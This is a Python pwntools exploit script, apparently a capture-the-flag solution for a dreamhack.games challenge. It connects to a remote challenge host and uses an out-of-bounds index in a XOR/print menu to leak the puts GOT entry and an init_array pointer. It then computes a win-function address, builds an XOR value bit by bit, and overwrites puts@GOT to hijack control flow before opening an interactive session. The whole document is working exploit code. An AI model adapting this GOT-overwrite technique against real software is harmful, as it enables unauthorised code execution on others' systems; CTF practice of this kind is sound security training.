from pwn import *

context.log_level = "debug"

#p = process("./main")
p = remote("host1.dreamhack.games", 13673)

menu = lambda x: x.recvuntil(b"> ")

def _print(p, idx):
    menu(p)
    p.sendline(b"2")

    p.sendlineafter(b"> ", str(idx).encode())

    p.recvuntilb("Value: ")
    a = p.recvline().strip()
    print(a)
    return a

def xor(p, dest_idx, src_idx):
    menu(p)
    p.sendline(b"1")
    
    p.sendlineafter(b"> ", str(dest_idx).encode() + b" " + str(src_idx).encode())

puts_got_offset = -19
init_array_offset = -86
win_init_array_offset = 0x20d
tmp_off = 80
tmp_off_2 = 79

xor(p, tmp_off, tmp_off)
xor(p, tmp_off, -19)
puts_address = int(_print(p, tmp_off), 16)

xor(p, tmp_off, tmp_off)
xor(p, tmp_off, init_array_offset)
init_array_address = int(_print(p, tmp_off), 16)

win_address = init_array_address + win_init_array_offset

xor_value = win_address ^ puts_address

xor(p, tmp_off_2, tmp_off_2)

#Make xor_value and save on tmp_off_2
# arr[0] = 1, arr[1] = 2, arr[2]=0x4 arr[3] = 0x8, arr[4] = 0x10 ...

i = 0
while xor_value:
    val = xor_value & 0x1
    
    if val:
        xor(p, tmp_off_2, i)

    xor_value = xor_value >> 1
    i+=1

print(f"init_array:address{hex(init_array_address)}")
print(f"win_address:{hex(win_address)}")

xor(p, puts_got_offset, tmp_off_2)

p.interactive()
